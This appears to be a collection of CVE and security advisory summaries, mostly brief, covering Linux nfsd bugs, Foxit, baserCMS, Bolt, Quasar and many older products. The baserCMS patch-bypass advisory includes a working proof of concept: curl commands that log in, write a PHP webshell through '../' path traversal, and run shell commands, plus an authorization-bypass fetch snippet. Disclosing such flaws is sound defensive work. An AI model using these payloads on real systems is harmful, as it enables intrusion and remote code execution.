cves.summary:
In the Linux kernel, the following vulnerability has been resolved:

nfsd: fix possible fh_compose of wrong dentry in nfsd4_create_file()

dentry_create() can hypothetically provide a different dentry than the
one passed in.  This could happen, for example, if the exported
filesystem is NFS, and the server returned to OPEN a filehandle which
matched a directory that was already in the dcache.  Clearly this would
not be expected!

If this were to happen the dentry (child) that was already stored in
resfhp could be freed and later dereferenced.

We shouldn't call fh_compose() until we are certain that we have the
final dentry, so this patch moved the fh_compose() call to two places:
one for the case where the target already exists, and one after
dentry_create() where it was created.

In the Linux kernel, the following vulnerability has been resolved:

nfsd: fix partial-write detection in nfsd_direct_write

nfsd_direct_write() walks a list of write segments and, after each
vfs_iocb_iter_write(), tries to detect a short write so the loop can
stop before placing the next segment at a wrong file offset:

    host_err = vfs_iocb_iter_write(file, kiocb, &segments[i].iter);
    if (host_err < 0)
            return host_err;
    *cnt += host_err;
    if (host_err < segments[i].iter.count)
            break;	/* partial write */

vfs_iocb_iter_write() runs the iter through ->write_iter(), which
advances the iter by the number of bytes written. By the time the
check runs, segments[i].iter.count is the residual, not the original
request length:

    before write_iter: iter.count == original_len
    after  write_iter: iter.count == original_len - host_err

The condition then reduces to host_err < original_len - host_err, so
the break fires only when less than half of the segment was written.
Any short write completing between 50% and 99% of the segment slips
through; the loop advances to the next segment with kiocb->ki_pos
only bumped by the short amount, writing the next segment's payload
at the wrong offset and over-reporting *cnt to the NFS client.

Snapshot the segment's byte count before the write and compare
host_err against that snapshot so any short write breaks the loop.
Stack-based buffer overflow in SQL Server allows an unauthorized attacker to execute code over a network.

A use-after-free vulnerability exists in Foxit PDF Editor/Reader’s handling of PDF annotations. Reentrant annotation deletion triggered by embedded JavaScript can cause the application to access an annotation object after it has been released, resulting in a use-after-free condition and application crash.

A use-after-free vulnerability exists in Foxit PDF Editor/Reader’s handling of malformed PDF form fields. Improper validation during field-name traversal may cause the application to access a released object, resulting in an application crash.

A heap-based out-of-bounds read vulnerability exists in Foxit PDF Editor Reader’s handling of PDF image objects with inconsistent compression metadata. Insufficient validation during image decoding may result in an undersized buffer and an out-of-bounds read during rendering, causing an application crash.

Directory traversal vulnerability in the com.endymion.sake.servlet.mail.MailServlet servlet for Endymion SakeMail 1.0.36 and earlier allows remote attackers to read arbitrary files via a .. (dot dot) and a null character in the param_name parameter.

### Summary An authorization bypass occurs against the API endpoint `/baser/api/admin/` by abusing the session authentication fallback. ### Details The mail settings are used here as an example. Admin side: https://github.com/baserproject/basercms/blob/master/plugins/baser-core/config/permission.php#L100 With `auth => false`, it is not accessible with operator privileges. API side: https://github.com/baserproject/basercms/blob/master/plugins/baser-core/config/permission.php#L286 With `auth => true`, it is accessible even with operator privileges. First, the default group for operators has `auth_prefix = 'Admin'`, which does not include `Api/Admin`. https://github.com/baserproject/basercms/blob/master/plugins/baser-core/src/Model/Table/UsersTable.php#L389 Because of this condition, when trying to access the `Api/Admin` API with a JWT, operators have `auth_prefix = 'Admin'`, so they cannot obtain a JWT and should not be able to access it. However, there is a problem in `getAuthenticationService`. https://github.com/baserproject/basercms/blob/master/plugins/baser-core/src/BaserCorePlugin.php#L507 Here, session authentication is enabled even for the `Api/Admin` prefix. By accessing the API with a Referer header, session authentication becomes active, allowing access to the API without holding a JWT. As a result, all APIs configured with `auth => true` in `permission.php` become accessible by operators. ### PoC 1. Log in with a site operator (operator) privileged account. 2. Run the following code in DevTools: ```javascript fetch('/baser/api/admin/baser-core/site_configs/view.json', { headers: { 'Referer': location.origin + '/baser/admin/' } }) .then(r => r.json()) .then(d => { console.table(d.siteConfig); }) ```

### Summary

The security patch introduced in baserCMS 5.2.3 to address CVE-2026-30940 / [GHSA-c5c6-37vq-pjcq](https://github.com/baserproject/basercms/security/advisories/GHSA-c5c6-37vq-pjcq) is **incomplete**. The patch added a `realpath()`-based directory traversal check in `BcThemeFileService::getFullpath()`, but the check is **entirely skipped** when `realpath($baseDir)` returns `false` — which occurs whenever the target subdirectory does not physically exist on disk.

An authenticated administrator can bypass the patch by supplying a `type` value (e.g., `js`) that maps to a non-existent directory in the theme. The absence of the directory causes `realpath()` to return `false`, the validation block is skipped, and the raw `path` parameter containing `../` sequences is returned unvalidated. This enables arbitrary file write and remote code execution (RCE) — the exact same impact as the original CVE.

**This vulnerability was verified exploitable on baserCMS 5.2.3 (the "patched" version of CVE-2026-30940).**

### Details

The vulnerability exists in `BcThemeFileService::getFullpath()` at [`plugins/bc-theme-file/src/Service/BcThemeFileService.php` lines 70–82](https://github.com/baserproject/basercms/blob/5.2.x/plugins/bc-theme-file/src/Service/BcThemeFileService.php#L70):

```php
public function getFullpath(string $theme, string $plugin, string $type, string $path)
{
    // ...build $baseDir and $fullPath from $theme, $type, $path...
    $baseDir  = $viewPath . $type . DS;      // e.g. .../BcThemeSample/webroot/js/
    $fullPath = $baseDir  . $path;           // e.g. .../webroot/js/../../../../webroot/

    $resolvedBase = realpath($baseDir);
    if ($resolvedBase !== false) {           // ← BYPASS: entire block skipped when dir absent
        $resolvedBase = rtrim($resolvedBase, DS) . DS;
        $targetDir = realpath(dirname($fullPath));
        if ($targetDir === false) {
            $targetDir = $this->normalizePath(dirname($fullPath));
        }
        if (!str_starts_with(rtrim($targetDir, DS) . DS, $resolvedBase)) {
            throw new BcException(__d('baser_core', 'パスにテーマディレクトリ外への参照が含まれています。'));
        }
    }

    return $fullPath;   // ← Returns unvalidated path when realpath returns false
}
```

**Root cause — the bypass condition:**

| `realpath($baseDir)` result | Behavior |
|-----------------------------|----------|
| Valid path string (dir **exists**) | Validation runs → `../` traversal **blocked** ✓ |
| `false` (dir does **not** exist) | Validation **skipped entirely** → `../` traversal **allowed** ✗ |

**Difference from CVE-2026-30940 (original bug):**

| | CVE-2026-30940 (≤ 5.2.2) | This bypass (5.2.3) |
|--|--|--|
| Validation | None at all | `realpath()` check — but conditional |
| `type` needed | Any valid type (`layout`, `cell`, …) | Must map to a **non-existent** subdirectory |
| `path` blocked | Never | Only when target dir already exists |
| Root cause | Missing validation | `if ($resolvedBase !== false)` skips false case |

### PoC

**Prerequisites:**
- baserCMS 5.2.3 (the officially patched version of CVE-2026-30940)
- Admin credentials
- `USE_CORE_ADMIN_API=true` in `.env`
- BcThemeFile plugin installed and BcThemeSample theme loaded

**Step 1 — Login and obtain JWT token:**

```bash
curl -s -X POST "http://localhost/baser/api/admin/baser-core/users/login.json" \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@example.com","password":"password"}'
# Response: {"access_token":"eyJ0eXA...","refresh_token":"eyJ0eXA..."}
```

**Step 2 — Verify bypass condition (webroot/js/ must not exist):**

The bypass requires `type=js` to map to a non-existent directory. Confirm:

```bash
# webroot/js/ does NOT exist → realpath() returns false → validation SKIPPED
ls plugins/BcThemeSample/webroot/
# Expected output: css  img   (no js/)
```

**Step 3 — Exploit: write PHP webshell directly to webroot:**

Path calculation from `baseDir = .../BcThemeSample/webroot/js/`:
- `js/` (1 up) → `webroot/`
- `webroot/` (2 up) → `BcThemeSample/`
- `BcThemeSample/` (3 up) → `plugins/`
- `plugins/` (4 up) → `/var/www/html/` + `webroot/`
- Result: `../../../../webroot/` → `/var/www/html/webroot/`

```bash
TOKEN="eyJ0eXA..."   # from step 1

curl -s -X POST "http://localhost/baser/api/admin/bc-theme-file/theme_files/add.json" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "theme":    "BcThemeSample",
    "plugin":   "",
    "type":     "js",
    "path":     "../../../../webroot/",
    "base_name":"rce_direct",
    "ext":      "php",
    "contents": "<?php echo shell_exec($_GET[\"c\"]); ?>"
  }'
# Response: HTTP 200 {"message":"ファイル「rce_direct.php」を作成しました。",...}
```

**Step 4 — Execute RCE:**

```bash
curl "http://localhost/rce_direct.php?c=id"
# Output: uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)
```

**Verified output (Docker, baserCMS 5.2.3):**

```
=RCE_DIRECT=uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)
```
### Impact

An authenticated administrator can achieve remote code execution by writing an arbitrary PHP file to any directory accessible by the web server — including `webroot/`, `config/`, or `tmp/`. This is the identical impact as CVE-2026-30940, rendering the 5.2.3 patch ineffective.

The vulnerability is particularly significant because:

1. **Patch bypass:** Operators and users who upgraded to 5.2.3 specifically to address CVE-2026-30940 remain vulnerable.
2. **Arbitrary directory write:** The bypass allows writing to `webroot/` (directly HTTP-accessible), `config/` (application configuration), or any other directory writable by the PHP process.
3. **File deletion and overwrite:** Beyond RCE, the attacker can delete or overwrite critical files, causing denial of service or persistent backdoors.
4. **One-shot per non-existent directory:** The exploit creates the target directory as a side effect. Rotating to other unused `type` values (e.g., `font`, `audio`, any arbitrary string) restores the bypass condition.

**CVSS v3.1:** `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` — Score: **7.2 (High)**  
Same as CVE-2026-30940 — attack complexity is unchanged by the incomplete patch.

### Recommended Fix

The patch must validate the path **unconditionally**, regardless of whether `$baseDir` exists on disk. Replace the `realpath()`-conditional block with `normalizePath()` (already defined in the same class):

```php
// CURRENT (vulnerable — skips validation when $baseDir does not exist)
$resolvedBase = realpath($baseDir);
if ($resolvedBase !== false) {
    // ... validation only runs here ...
}
return $fullPath;

// FIXED — always validate using normalizePath()
$normalizedBase   = rtrim($this->normalizePath($baseDir),            DS) . DS;
$normalizedTarget = rtrim($this->normalizePath(dirname($fullPath)),  DS) . DS;

if (!str_starts_with($normalizedTarget, $normalizedBase)) {
    throw new BcException(__d('baser_core', 'パスにテーマディレクトリ外への参照が含まれています。'));
}
return $fullPath;
```

Additionally, the `path` and `ext` parameters should be validated at the API controller layer:

```php
// In ThemeFilesController — validate before calling getFullpath()
if (preg_match('/\.\./', $data['path'])) {
    throw new BcException('Invalid path parameter.');
}
if (!preg_match('/^[a-zA-Z0-9]+$/', $data['ext'])) {
    throw new BcException('Invalid extension.');
}
```

### References

- [GHSA-c5c6-37vq-pjcq — Original CVE-2026-30940 advisory](https://github.com/baserproject/basercms/security/advisories/GHSA-c5c6-37vq-pjcq)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-706: Use of Incorrectly-Resolved Name or Reference](https://cwe.mitre.org/data/definitions/706.html)
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- `plugins/bc-theme-file/src/Service/BcThemeFileService.php` — `getFullpath()`, lines 70���82
- `plugins/bc-theme-file/src/Form/ThemeFileForm.php` — `_execute()`, lines 64–69
- `plugins/bc-theme-file/src/Controller/Api/Admin/ThemeFilesController.php` — `add()`, lines 38–60

### Impact

SQL Injection in ListFormatHelper allows authenticated users with the upload permission to execute arbitrary SQL queries and exfiltrate sensitive database contents through the /async/select-options endpoint when general/caching/list_format is enabled.

### Patches

This has been patched in Bolt 6.1.4.

cves.summary:
### Impact

The `/bolt/async/upload-url` and `/bolt/async/embed` endpoints validated only the **submitted** URL before fetching it server-side, but the fetch then **followed redirects to destinations that were never re-validated**. This allowed an authenticated user to bypass the SSRF guard (`UrlSafetyChecker`) and make the server issue requests to internal/cloud-metadata addresses.

### Patches

This issue has been patched with Bolt 6.1.5.

### Impact

A missing access-control filter in the public Relation API allowed unauthenticated users to discover metadata about unpublished, draft, and viewless content through REST and GraphQL endpoints.

### Patches

This has been patched in Bolt 6.1.4.

cwe.name: Transmission of Private Resources into a New Sphere

tcpdump before 3.8.1 allows remote attackers to cause a denial of service (infinite loop) via certain ISAKMP packets, a different vulnerability than CVE-2004-0057.

osTicket allows remote attackers to view sensitive uploaded files and possibly execute arbitrary code via an HTTP request that uploads a PHP file to the ticket attachments directory.

Multiple buffer overflows in the (1) dbm_open function, as used in ndbm and dbm, and the (2) dbminit function in Solaris 2.6 through 9 allow local users to gain root privileges via long arguments to Xsun or other programs that use these functions.

### Summary A DOM Clobbering vulnerability exists in Quasar's `openURL()` utility when handling the iOS `SafariViewController` bridge. The vulnerable implementation only checks whether `window.SafariViewController` exists before invoking it as a native bridge object. An attacker who can inject HTML content containing a named element such as `` can cause the browser to expose that element as `window.SafariViewController`. When `openURL()` is later called in an iOS environment, Quasar incorrectly treats the DOM element as the native bridge object and attempts to invoke bridge methods that do not exist, resulting in: ``` TypeError: window.SafariViewController.isAvailable is not a function ``` This can cause client-side denial of service and break navigation-related workflows in Quasar applications. ### Details Quasar provides the `openURL()` utility to open external URLs. On iOS platforms, this utility supports integration with the native `SafariViewController` bridge. The vulnerable code is located in: ``` ui/src/utils/open-url/open-url.js ```` The affected logic is: ```javascript if (Platform.is.ios && window.SafariViewController !== void 0) { window.SafariViewController.isAvailable(available => { if (available) { window.SafariViewController.show({ url }, noop, reject) } }) } ```` The issue is that Quasar only verifies that `window.SafariViewController` is not `undefined`. It does not verify whether the value is the expected native bridge object or whether required methods such as `isAvailable()` and `show()` are valid functions. Modern browsers expose elements with specific `id` or `name` attributes as properties of the global `window` object. Therefore, attacker-controlled HTML such as: ```html ``` can cause: ```javascript window.SafariViewController ``` to resolve to an `HTMLAnchorElement` instead of the expected native bridge object. When Quasar later executes: ```javascript window.SafariViewController.isAvailable(...) ``` the DOM element is incorrectly treated as the bridge object, causing: ``` TypeError: window.SafariViewController.isAvailable is not a function ``` The root cause is insufficient validation of browser-controlled global properties before using them as trusted native bridge objects. The vulnerability was verified through the Quasar `QEditor` rendering path. When attacker-controlled HTML content is rendered into the DOM and creates the `SafariViewController` named element, subsequent calls to `openURL()` fail. Additional component-level affected paths were identified in `QSelect` and `QChatMessage` when applications enable HTML rendering features and provide attacker-controlled content. These paths require specific application configurations and were not used as the primary end-to-end reproduction. ### PoC #### Steps to reproduce 1. Render attacker-controlled HTML content through a Quasar HTML rendering component such as `QEditor`. 2. Insert the following payload: ```html SafariViewController ```` 3. Verify that the browser exposes the element as a global property: ```javascript window.SafariViewController ``` The value resolves to the injected DOM element instead of the expected native bridge object. 4. Trigger a normal workflow that invokes: ```javascript openURL('https://example.com') ``` 5. Observe the browser console output: ``` TypeError: window.SafariViewController.isAvailable is not a function ``` The URL opening workflow fails because Quasar attempts to invoke native bridge methods on the DOM element. The same underlying issue can also affect other HTML rendering paths such as `QSelect` and `QChatMessage` when attacker-controlled HTML is rendered and the application later calls `openURL()`. ### Impact This vulnerability is a client-side DOM Clobbering and type confusion issue affecting Quasar applications that use the iOS `SafariViewController` integration. An attacker who can control HTML content rendered into the application DOM may cause Quasar's `openURL()` functionality to fail by replacing the expected native bridge object with a DOM element through browser named property resolution. Potentially affected workflows include external URL navigation, OAuth/login redirects, help or documentation links, payment flows, third-party service redirects, and other application actions that rely on URL opening functionality. The confirmed impact is client-side denial of service and navigation or workflow disruption. When the vulnerable condition is triggered, Quasar throws an exception while attempting to invoke methods on the clobbered `SafariViewController` object, preventing the expected URL opening behavior.

cves.summary: A buffer overflow in TenFour TFS Gateway SMTP mail server 3.2 allows an attacker to crash the mail server and possibly execute arbitrary code by offering more than 128 bytes in a MAIL FROM string.
SQL injection vulnerability in pass_done.php for PY-Membres 4.2 and earlier allows remote attackers to execute arbitrary SQL queries via the email parameter.
The passwd command in Solaris can be subjected to a denial of service.
Windows NT automatically logs in an administrator upon rebooting.

MDG Computer Services Web Server 4D WS4D/eCommerce 3.0 and earlier, and possibly 3.5.3, allows remote attackers to cause a denial of service and possibly execute arbitrary commands via a long HTTP request.
Alt-N Technologies Mdaemon 5.0 through 5.0.6 uses a weak encryption algorithm to store user passwords, which allows local users to crack passwords.
Buffer overflow in WorldClient.cgi in WorldClient in Alt-N Technologies MDaemon 5.0.5.0 and earlier allows local users to execute arbitrary code via a long folder name (NewFolder parameter).

The default configuration of NewAtlanta ServletExec ISAPI 4.1 allows remote attackers to determine the path of the web root via a direct request to com.newatlanta.servletexec.JSP10Servlet without a filename, which leaks the pathname in an error message.

Directory traversal vulnerability in NewAtlanta ServletExec ISAPI 4.1 allows remote attackers to read arbitrary files via a URL-encoded request to com.newatlanta.servletexec.JSP10Servlet containing "..%5c" (modified dot-dot) sequences.
Format string vulnerability in the logging function in IGI 2 Covert Strike server 1.3 and earlier allows remote attackers to execute arbitrary code via format string specifiers in RCON commands.
Portage before 2.0.50-r3 allows local users to overwrite arbitrary files via a hard link attack on the lockfiles.

The Citrix MetaFrame Password Manager 2.0, when a central credential store is not configured, does not encrypt passwords entered immediately after executing the First Time User Wizards, which allows local users to gain sensitive information.

Mailman 2.0.x before 2.0.6 allows remote attackers to gain access to list administrative pages when there is an empty site or list password, which is not properly handled during the call to the crypt function during authentication.

Baltimore Technologies WEBsweeper 4.02, when used to manage URL blacklists, allows remote attackers to bypass blacklist restrictions and connect to unauthorized web servers by modifying the requested URL, including (1) a // (double slash), (2) a /SUBDIR/.. where the desired file is in the parentdir, (3) a /./, or (4) URL-encoded characters.
D-Link DI-704 Internet Gateway firmware earlier than V2.56b6 allows remote attackers to cause a denial of service (reboot) via malformed IP datagram fragments.
fetchmailconf in fetchmail before 5.7.4 allows local users to overwrite files of other users via a symlink attack on temporary files.

Cross-Frame scripting vulnerability in the WebBrowser control as used in Internet Explorer 5.5 and 6.0 allows remote attackers to execute arbitrary code, read arbitrary files, or conduct other unauthorized activities via script that accesses the Document property, which bypasses <frame> and <iframe> domain restrictions.
Buffer overflow in the embedded HTTP server for Cisco Catalyst switches running CatOS 5.4 through 7.3 allows remote attackers to cause a denial of service (reset) via a long HTTP request.

Buffer overflow in DSC 3.0 parser from GSview, as used in KGhostView in KDE 1.1 and KDE 3.0.3a, may allow attackers to cause a denial of service or execute arbitrary code via a modified .ps (PostScript) input file.
